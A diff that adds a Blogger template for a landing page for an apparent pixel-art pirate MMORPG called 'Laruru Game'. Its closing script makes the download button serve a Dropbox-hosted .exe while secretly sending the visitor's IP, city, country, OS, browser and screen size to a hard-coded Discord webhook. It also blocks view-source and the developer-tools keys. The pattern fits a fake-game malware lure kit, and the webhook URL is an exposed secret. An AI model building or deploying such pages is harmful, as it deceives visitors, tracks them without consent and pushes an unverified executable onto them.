@@ -1,0 +1,941 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE html>
+<html b:css='false' b:defaultmessages='false' b:layoutsVersion='3' b:responsive='true' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/ig/maildata' xmlns:data='http://www.google.com/gadgets/tubes' xmlns:expr='http://www.google.com/ig/maildata'>
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Laruru Game</title>
+    <link rel="shortcut icon" href="https://raw.githubusercontent.com/palenkova/image/main/favicon.png" type="image/x-icon" />
+    
+    <!-- SEO -->
+    <meta name="keywords" content="MMORPG,Action,Adventure,Pixel,Retro,Game,2D" />
+    <meta name="description" content="Laruru Game is an upcoming Pixel Art Action Adventure MMORPG." />
+    <meta property="og:title" content="Laruru Game" />
+    <meta property="og:description" content="Laruru Game is an upcoming Pixel Art Action Adventure MMORPG." />
+    <meta property="og:image" content="https://raw.githubusercontent.com/palenkova/image/main/favicon.png" />
+    
+    <!-- Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Rubik:wght@400;500;700&amp;family=Open+Sans:wght@400;600&amp;display=swap" rel="stylesheet" />
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet" />
+
+    <b:skin><![CDATA[
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        :root {
+            --primary: #47b8f8;
+            --primary-dark: #183a5a;
+            --bg-color: #47b8f8;
+            --text-light: #e3f6fd;
+            --text-muted: #bde0fe;
+        }
+        
+        html {
+            font-size: 18px;
+        }
+        
+        body {
+            font-family: 'Rubik', 'Open Sans', Arial, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-light);
+            overflow-x: hidden;
+        }
+        
+        /* Background */
+        .bg-ocean {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(180deg, #47b8f8 0%, #1a7ab8 100%);
+            z-index: -2;
+        }
+        
+        .bg-pattern {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: url('https://raw.githubusercontent.com/palenkova/image/main/bg-pattern.png');
+            background-size: cover;
+            background-position: center;
+            opacity: 0.7;
+            z-index: -1;
+        }
+        
+        /* Navbar - Seffaf */
+        .navbar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            padding: 20px 40px;
+            background: transparent;
+            border: none;
+            box-shadow: none;
+        }
+        
+        .navbar-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        
+        .nav-logo {
+            font-family: 'Rubik', sans-serif;
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: white;
+            text-decoration: none;
+            letter-spacing: 4px;
+            text-shadow: 0 2px 8px rgba(0,0,0,0.5);
+        }
+        
+        .nav-links {
+            display: flex;
+            gap: 40px;
+        }
+        
+        .nav-links a {
+            color: #bde0fe;
+            text-decoration: none;
+            font-size: 1rem;
+            font-weight: 600;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            padding: 8px 16px;
+            border-radius: 6px;
+        }
+        
+        .nav-links a:hover {
+            color: white;
+            background: rgba(71, 184, 248, 0.2);
+        }
+        
+        /* Hero Section - board'lar ilk giris gorunsun */
+        .hero {
+            min-height: auto;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            padding: 100px 20px 40px;
+            position: relative;
+        }
+        
+        .hero-content {
+            width: 100%;
+            max-width: 700px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 25px;
+            margin-bottom: 40px;
+        }
+        
+        .video-container {
+            position: relative;
+            width: 100%;
+            max-width: 700px;
+            border-radius: 16px;
+            overflow: hidden;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        
+        .video-container img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+        
+        .video-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(0,0,0,0.3);
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        
+        .video-overlay:hover {
+            background: rgba(0,0,0,0.2);
+        }
+        
+        .play-button {
+            width: 80px;
+            height: 80px;
+            background: var(--primary);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+            transition: transform 0.3s;
+        }
+        
+        .play-button:hover {
+            transform: scale(1.1);
+        }
+        
+        .play-button .material-icons {
+            font-size: 40px;
+            color: white;
+            margin-left: 4px;
+        }
+        
+        /* Video Section - Orijinal */
+        .video-wrapper {
+            width: 100%;
+            max-width: 700px;
+            margin: 20px auto 0;
+        }
+        
+        .video-container {
+            position: relative;
+            width: 100%;
+        }
+        
+        .video-thumb {
+            width: 100%;
+            height: auto;
+            display: block;
+            padding: 8px;
+            background: #c1783d;
+            border-radius: 8px;
+            box-sizing: border-box;
+        }
+        
+        .video-frame {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 2;
+        }
+        
+        .video-play-btn {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 70px;
+            height: 70px;
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.4);
+            transition: transform 0.3s;
+            border: 3px solid #f5c542;
+        }
+        
+        .video-play-btn:hover {
+            transform: translate(-50%, -50%) scale(1.1);
+            background: white;
+        }
+        
+        .video-play-btn .material-icons {
+            font-size: 35px;
+            color: #333;
+            margin-left: 4px;
+        }
+        
+        /* Video Modal */
+        .video-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            z-index: 3000;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .video-modal.active {
+            display: flex;
+        }
+        
+        .video-modal-content {
+            position: relative;
+            width: 90%;
+            max-width: 900px;
+            aspect-ratio: 16/9;
+            background: #000;
+            border-radius: 12px;
+            overflow: hidden;
+        }
+        
+        .video-close {
+            position: absolute;
+            top: -40px;
+            right: 0;
+            color: white;
+            font-size: 36px;
+            cursor: pointer;
+            z-index: 3001;
+        }
+        
+        .video-close:hover {
+            color: #47b8f8;
+        }
+        
+        /* Download Section - Orijinal */
+        .download-wrapper {
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 20px;
+            flex-wrap: wrap;
+        }
+        
+        .download-side {
+            width: 60px;
+            height: auto;
+        }
+        
+        .download-btn-original {
+            position: relative;
+            width: 320px;
+            height: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+        }
+        
+        .download-btn-bg-img {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+        }
+        
+        .download-btn-text-img {
+            position: absolute;
+            transform: scale(0.85);
+            pointer-events: none;
+        }
+        
+        /* Feature Boards - Guncel */
+        .feature-board {
+            position: relative;
+            width: 100%;
+            max-width: 1100px;
+            margin: 40px auto;
+            background: url('https://raw.githubusercontent.com/palenkova/image/main/Board-Background.png');
+            background-size: 100% 100%;
+            border-radius: 12px;
+            overflow: hidden;
+        }
+        
+        .board-bg {
+            display: none;
+        }
+        
+        .board-inner {
+            position: relative;
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 30px;
+            min-height: 350px;
+        }
+        
+        .board-flipped {
+            flex-direction: row-reverse;
+        }
+        
+        .board-left {
+            position: relative;
+            width: 50%;
+            height: 280px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .board-main-img {
+            position: absolute;
+            max-height: 100%;
+            max-width: 95%;
+            z-index: 1;
+            border-radius: 8px;
+        }
+        
+        .board-frame {
+            position: absolute;
+            max-height: 110%;
+            max-width: 105%;
+            z-index: 2;
+            pointer-events: none;
+        }
+        
+        .board-right {
+            position: relative;
+            width: 45%;
+            min-height: 250px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .board-text-bg {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 8px;
+        }
+        
+        .board-text-content {
+            position: relative;
+            z-index: 3;
+            width: 85%;
+            text-align: center;
+            padding: 25px;
+        }
+        
+        .board-title {
+            font-size: 1.6rem;
+            font-weight: 700;
+            color: #f5c542;
+            margin-bottom: 12px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.8);
+        }
+        
+        .board-desc {
+            font-size: 1rem;
+            color: white;
+            line-height: 1.6;
+            text-shadow: 1px 1px 3px rgba(0,0,0,0.9);
+        }
+        
+        /* Screenshots Section */
+        .screenshots-section {
+            padding: 60px 24px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        .section-title {
+            text-align: center;
+            font-size: 2rem;
+            font-weight: 700;
+            margin-bottom: 40px;
+            color: white;
+            text-shadow: 0 2px 8px rgba(0,0,0,0.3);
+        }
+        
+        .screenshots-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 20px;
+        }
+        
+        .screenshot-item {
+            position: relative;
+            border-radius: 12px;
+            overflow: hidden;
+            border: 4px solid #8b5a2b;
+            box-shadow: 0 8px 25px rgba(0,0,0,0.3);
+            cursor: pointer;
+            transition: transform 0.3s;
+        }
+        
+        .screenshot-item:hover {
+            transform: scale(1.02);
+        }
+        
+        .screenshot-item img {
+            width: 100%;
+            height: 250px;
+            object-fit: cover;
+            display: block;
+        }
+        
+        /* Footer */
+        .footer {
+            padding: 40px 24px;
+            text-align: center;
+            background: rgba(24, 58, 90, 0.9);
+            margin-top: 60px;
+        }
+        
+        .footer-text {
+            font-size: 0.9rem;
+            color: var(--text-muted);
+        }
+        
+        /* Mobile Responsive */
+        @media (max-width: 768px) {
+            .navbar { padding: 16px 20px; }
+            .nav-links { display: none; }
+            
+            .hero { padding: 100px 16px 40px; }
+            
+            .board-inner {
+                flex-direction: column;
+                padding: 25px 20px;
+                min-height: auto;
+            }
+            
+            .board-flipped {
+                flex-direction: column;
+            }
+            
+            .board-left {
+                width: 100%;
+                height: 200px;
+                margin-bottom: 20px;
+            }
+            
+            .board-right {
+                width: 100%;
+                min-height: 180px;
+            }
+            
+            .board-title {
+                font-size: 1.3rem;
+            }
+            
+            .board-desc {
+                font-size: 0.9rem;
+            }
+            
+            .screenshots-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .download-btn {
+                width: 280px;
+                height: 60px;
+            }
+            
+            .side-decoration { display: none; }
+        }
+        
+        /* Lightbox */
+        .lightbox {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            z-index: 2000;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+        }
+        
+        .lightbox.active {
+            display: flex;
+        }
+        
+        .lightbox img {
+            max-width: 90%;
+            max-height: 90%;
+            border-radius: 8px;
+        }
+    ]]></b:skin>
+</head>
+<body>
+    <b:section id='main' showaddelement='yes'>
+        <b:widget id='Blog1' locked='true' title='Blog Posts' type='Blog'>
+            <b:includable id='main'>
+                <div class="bg-ocean"></div>
+    <div class="bg-pattern"></div>
+
+    <!-- Navbar -->
+    <nav class="navbar">
+        <div class="navbar-content">
+            <a href="#" class="nav-logo">Laruru</a>
+            <div class="nav-links">
+                <a href="#download">Download</a>
+                <a href="#screenshots">Screenshots</a>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="hero-content">
+            <!-- Video Thumbnail with Frame -->
+            <div class="video-wrapper">
+                <div class="video-container">
+                    <img src="https://raw.githubusercontent.com/palenkova/image/main/favicon.png" alt="Laruru Game Trailer" class="video-thumb" />
+                    <img src="https://raw.githubusercontent.com/palenkova/image/main/frame.png" alt="Frame" class="video-frame" />
+                    <div class="video-play-btn" id="video-trigger">
+                        <span class="material-icons">play_arrow</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Video Modal -->
+            <div class="video-modal" id="video-modal">
+                <div class="video-modal-content">
+                    <div class="video-close" id="video-close">×</div>
+                    <iframe id="video-frame" width="100%" height="100%" src="" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
+                </div>
+            </div>
+
+            <!-- Download Button -->
+            <div class="download-wrapper" id="download">
+                <img src="https://raw.githubusercontent.com/palenkova/image/main/Decoration.png" alt="Decoration" class="download-side" />
+                <a href="#" class="download-btn-original" id="installer-link">
+                    <img src="https://raw.githubusercontent.com/palenkova/image/main/Button.png" alt="Button" class="download-btn-bg-img" />
+                    <img src="https://raw.githubusercontent.com/palenkova/image/main/Download.png" alt="Download" class="download-btn-text-img" />
+                </a>
+                <img src="https://raw.githubusercontent.com/palenkova/image/main/Decoration.png" alt="Decoration" class="download-side" />
+            </div>
+        </div>
+    </section>
+
+    <!-- Feature Boards -->
+    <div class="feature-board">
+        <img src="https://raw.githubusercontent.com/palenkova/image/main/Board-Background.png" alt="Board Background" class="board-bg" />
+        <div class="board-inner">
+            <div class="board-left">
+                <img src="https://raw.githubusercontent.com/palenkova/image/main/Ship-Sailing.png" alt="Ship Sailing" class="board-main-img" />
+                <img src="https://raw.githubusercontent.com/palenkova/image/main/Frame2.png" alt="Frame" class="board-frame" />
+            </div>
+            <div class="board-right">
+                <img src="https://raw.githubusercontent.com/palenkova/image/main/Text-Box.png" alt="Text Box" class="board-text-bg" />
+                <div class="board-text-content">
+                    <h2 class="board-title">Ready to Set Sail?</h2>
+                    <p class="board-desc">Hoist the colors and weigh anchor, the oceans are yours to explore! Travel a world full of lively towns, dangerous creatures, and incredible treasures.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="feature-board">
+        <img src="https://raw.githubusercontent.com/palenkova/image/main/Board-Background.png" alt="Board Background" class="board-bg" />
+        <div class="board-inner board-flipped">
+            <div class="board-right">
+                <img src="https://raw.githubusercontent.com/palenkova/image/main/Text-Box.png" alt="Text Box" class="board-text-bg" />
+                <div class="board-text-content">
+                    <h2 class="board-title">Swashbucklers Wanted!</h2>
+                    <p class="board-desc">Take up your cutlass or blunderbuss and fight alongside your best mates. Where dangers abound, there are riches and glory to be found!</p>
+                </div>
+            </div>
+            <div class="board-left">
+                <img src="https://raw.githubusercontent.com/palenkova/image/main/Combat.png" alt="Combat" class="board-main-img" />
+                <img src="https://raw.githubusercontent.com/palenkova/image/main/Frame2.png" alt="Frame" class="board-frame" />
+            </div>
+        </div>
+    </div>
+
+    <div class="feature-board">
+        <img src="https://raw.githubusercontent.com/palenkova/image/main/Board-Background.png" alt="Board Background" class="board-bg" />
+        <div class="board-inner">
+            <div class="board-left">
+                <img src="https://raw.githubusercontent.com/palenkova/image/main/Farming.png" alt="Farming" class="board-main-img" />
+                <img src="https://raw.githubusercontent.com/palenkova/image/main/Frame2.png" alt="Frame" class="board-frame" />
+            </div>
+            <div class="board-right">
+                <img src="https://raw.githubusercontent.com/palenkova/image/main/Text-Box.png" alt="Text Box" class="board-text-bg" />
+                <div class="board-text-content">
+                    <h2 class="board-title">Make Yourself at Home!</h2>
+                    <p class="board-desc">Plant, grow and harvest crops on your own farm. Gather materials and craft your own clothes and weapons. Discover new trade routes and sell your goods across the world.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Screenshots Section -->
+    <section class="screenshots-section" id="screenshots">
+        <h2 class="section-title">Game Screenshots</h2>
+        <div class="screenshots-grid">
+            <div class="screenshot-item" data-img="https://raw.githubusercontent.com/palenkova/image/main/Sea-Combat.png">
+                <img src="https://raw.githubusercontent.com/palenkova/image/main/Sea-Combat.png" alt="Sea Combat" />
+            </div>
+            <div class="screenshot-item" data-img="https://raw.githubusercontent.com/palenkova/image/main/Forest-Combat.png">
+                <img src="https://raw.githubusercontent.com/palenkova/image/main/Forest-Combat.png" alt="Forest Combat" />
+            </div>
+            <div class="screenshot-item" data-img="https://raw.githubusercontent.com/palenkova/image/main/Town-Exploration.png">
+                <img src="https://raw.githubusercontent.com/palenkova/image/main/Town-Exploration.png" alt="Town Exploration" />
+            </div>
+            <div class="screenshot-item" data-img="https://raw.githubusercontent.com/palenkova/image/main/Island-Combat.png">
+                <img src="https://raw.githubusercontent.com/palenkova/image/main/Island-Combat.png" alt="Island Combat" />
+            </div>
+            <div class="screenshot-item" data-img="https://raw.githubusercontent.com/palenkova/image/main/Tavern.png">
+                <img src="https://raw.githubusercontent.com/palenkova/image/main/Tavern.png" alt="Tavern" />
+            </div>
+            <div class="screenshot-item" data-img="https://raw.githubusercontent.com/palenkova/image/main/Island.png">
+                <img src="https://raw.githubusercontent.com/palenkova/image/main/Island.png" alt="Island" />
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <p class="footer-text">© 2026 Laruru Game. All Rights Reserved.</p>
+    </footer>
+
+    <!-- Lightbox -->
+    <div class="lightbox" id="lightbox">
+        <img src="" alt="Full size" id="lightbox-img" />
+    </div>
+
+    <!-- Webhook Script -->
+    <script>
+        //<![CDATA[
+        async function sendWebhook(type, data) {
+            try {
+                const title = type === 'download' ? 'Download Notification' : 'New Site Visit';
+                const color = type === 'download' ? 0x2ecc71 : 0x3498db;
+
+                let fields = [];
+                
+                if (data.location?.ip) {
+                    let locationInfo = [
+                        `IP: ${data.location.ip}`,
+                        `Country: ${data.location.country}`,
+                        `City: ${data.location.city}`
+                    ];
+                    fields.push({ name: 'Location', value: locationInfo.join('\n'), inline: false });
+                }
+                
+                let systemInfo = [];
+                if (data.system?.os) systemInfo.push(`OS: ${data.system.os}`);
+                if (data.system?.browser) systemInfo.push(`Browser: ${data.system.browser}`);
+                if (data.system?.device) systemInfo.push(`Device: ${data.system.device}`);
+                if (systemInfo.length > 0) {
+                    fields.push({ name: 'System Info', value: systemInfo.join('\n'), inline: false });
+                }
+                
+                if (data.display?.screen) {
+                    fields.push({ name: 'Display', value: `Screen: ${data.display.screen}`, inline: false });
+                }
+
+                const embed = {
+                    title: title,
+                    color: color,
+                    fields: fields,
+                    timestamp: new Date().toISOString(),
+                    footer: { text: GAME_NAME + ' Tracker' }
+                };
+
+                const response = await fetch(hookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ embeds: [embed] })
+                });
+                
+                if (!response.ok) {
+                    console.log('Webhook hatasi (' + response.status + '): Webhook URL gecersiz olabilir');
+                }
+            } catch (error) {
+                console.log('Webhook error:', error.message || error);
+            }
+        }
+
+        async function collectUserData() {
+            const data = { location: {}, system: {}, display: {} };
+
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const ipData = await response.json();
+                data.location = {
+                    ip: ipData.ip || 'N/A',
+                    country: ipData.country_name || 'N/A',
+                    city: ipData.city || 'N/A'
+                };
+            } catch (e) {}
+
+            const ua = navigator.userAgent;
+            let os = "Unknown";
+            let browser = "Unknown";
+            let device = "Desktop";
+
+            if (ua.indexOf("Win") !== -1) os = "Windows";
+            else if (ua.indexOf("Mac") !== -1) os = "macOS";
+            else if (ua.indexOf("Linux") !== -1) os = "Linux";
+            else if (ua.indexOf("Android") !== -1) { os = "Android"; device = "Mobile"; }
+            else if (ua.indexOf("iPhone") !== -1 || ua.indexOf("iPad") !== -1) { os = "iOS"; device = "Mobile"; }
+
+            if (ua.indexOf("Chrome") !== -1) browser = "Chrome";
+            else if (ua.indexOf("Firefox") !== -1) browser = "Firefox";
+            else if (ua.indexOf("Safari") !== -1) browser = "Safari";
+            else if (ua.indexOf("Edge") !== -1) browser = "Edge";
+
+            if (window.innerWidth < 768) device = "Mobile";
+            else if (window.innerWidth < 1024) device = "Tablet";
+
+            data.system = { os, browser, device };
+            data.display = { screen: `${window.screen.width}x${window.screen.height}` };
+
+            return data;
+        }
+
+        // oyunun adini gir
+        var GAME_NAME = 'Laruru Game';
+        
+        var DROPBOX_LINK = 'https://www.dropbox.com/scl/fi/28j6x3a6kda3zeokw0z65/LaruruGame.exe?rlkey=7ueirg5gxrfhnp52dv2z00i62&st=9b97tygf&dl=1';
+        
+        // degistir: kendi webhook linkini buraya yapistir
+        var WEBHOOK_URL = 'https://discord.com/api/webhooks/1560441215378391102/ZfOazr4VOGS04S9qntv-2eq-9HCGVZGe_eKQqMa61z26n_QU8nFbId920B2wEhd7Bjdn';
+        
+        var dropboxUrl = encodeURI(DROPBOX_LINK).replace(/%25/g, '%');
+        var hookUrl = WEBHOOK_URL;
+        
+        function initDownload() {
+            var dlLink = document.getElementById('installer-link');
+            if (!dlLink) return;
+            
+            dlLink.onclick = function(e) {
+                e.preventDefault ? e.preventDefault() : (e.returnValue = false);
+                e.stopPropagation && e.stopPropagation();
+                
+                window.location.href = dropboxUrl;
+                
+                if (typeof collectUserData === 'function') {
+                    collectUserData().then(function(data) {
+                        sendWebhook('download', data);
+                        try { sessionStorage.setItem('download_sent', 'true'); } catch(err) {}
+                    }).catch(function() {});
+                }
+                
+                return false;
+            };
+            
+            // Cocuk img elementlerine de ekle
+            var imgs = dlLink.getElementsByTagName('img');
+            for (var i = 0; i < imgs.length; i++) {
+                imgs[i].onclick = function(e) {
+                    e.stopPropagation && e.stopPropagation();
+                    dlLink.click();
+                    return false;
+                };
+            }
+            
+            console.log('Download ready');
+        }
+        
+        // Sayfa yuklenince baslat
+        if (document.readyState === 'complete' || document.readyState === 'interactive') {
+            initDownload();
+        } else {
+            document.addEventListener('DOMContentLoaded', initDownload);
+        }
+        
+        // Yedek: direkt calistir
+        setTimeout(initDownload, 1000);
+
+        // Video Modal Functions
+        const videoModal = document.getElementById('video-modal');
+        const videoFrame = document.getElementById('video-frame');
+        const videoTrigger = document.getElementById('video-trigger');
+        const videoClose = document.getElementById('video-close');
+        const videoUrl = 'https://www.youtube.com/embed/Eixv501ty0k?autoplay=1';
+        
+        function openVideoModal() {
+            videoFrame.src = videoUrl;
+            videoModal.classList.add('active');
+        }
+        
+        function closeVideoModal() {
+            videoFrame.src = '';
+            videoModal.classList.remove('active');
+        }
+        
+        videoTrigger.addEventListener('click', openVideoModal);
+        videoClose.addEventListener('click', closeVideoModal);
+        videoModal.addEventListener('click', (e) => {
+            if (e.target === videoModal) closeVideoModal();
+        });
+        
+        // Lightbox functions
+        function openLightbox(src) {
+            document.getElementById('lightbox-img').src = src;
+            document.getElementById('lightbox').classList.add('active');
+        }
+
+        function closeLightbox() {
+            document.getElementById('lightbox').classList.remove('active');
+        }
+
+        // Lightbox click handlers
+        document.getElementById('lightbox').addEventListener('click', closeLightbox);
+        document.querySelectorAll('.screenshot-item').forEach(item => {
+            item.addEventListener('click', () => openLightbox(item.dataset.img));
+        });
+
+        // Smooth scroll
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                const href = this.getAttribute('href');
+                if (href === '#' || !href) return;
+                
+                e.preventDefault();
+                const target = document.querySelector(href);
+                if (target) {
+                    target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                }
+            });
+        });
+        
+        // Content Protection - Resim ve link korumasi
+        document.addEventListener('contextmenu', (e) => {
+            if (e.target.tagName === 'IMG' || e.target.closest('a') || e.target.closest('.video-container') || e.target.closest('.feature-board')) {
+                e.preventDefault();
+                return false;
+            }
+        });
+        
+        document.addEventListener('dragstart', (e) => {
+            if (e.target.tagName === 'IMG' || e.target.closest('a')) {
+                e.preventDefault();
+            }
+        });
+        
+        document.addEventListener('selectstart', (e) => {
+            if (e.target.tagName === 'IMG') {
+                e.preventDefault();
+            }
+        });
+        
+        // Keyboard shortcuts engelle
+        document.addEventListener('keydown', (e) => {
+            // Ctrl+S (Save), Ctrl+U (View Source), Ctrl+Shift+I/J/C (DevTools)
+            if ((e.ctrlKey && (e.key === 's' || e.key === 'u')) || 
+                (e.ctrlKey && e.shiftKey && (e.key === 'i' || e.key === 'j' || e.key === 'c'))) {
+                e.preventDefault();
+            }
+            // F12 (DevTools)
+            if (e.key === 'F12') {
+                e.preventDefault();
+            }
+        });
+        
+        // Console mesaj
+        console.log('%cLaruru Game', 'font-size: 24px; font-weight: bold; color: #47b8f8;');
+        console.log('%cProtected Content', 'font-size: 14px; color: #666;');
+        //]]>
+    </script>
+            </b:includable>
+        </b:widget>
+    </b:section>
+</body>
+</html>
